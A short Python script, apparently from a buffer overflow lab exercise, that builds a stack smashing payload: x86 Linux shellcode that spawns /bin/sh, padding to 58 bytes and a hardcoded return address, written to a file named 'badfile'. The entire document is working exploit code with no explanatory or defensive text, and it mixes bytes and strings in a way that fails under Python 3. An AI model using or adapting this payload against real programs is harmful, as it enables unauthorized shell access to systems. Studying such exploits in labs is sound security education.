import os
import struct

shellcode = (b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")
buffer = 0xbffff2fa

payload = shellcode
payload += "A"*(58-len(shellcode))
payload += struct.pack("I",buffer)

f = open("badfile","a")
f.write(payload)
f.close()
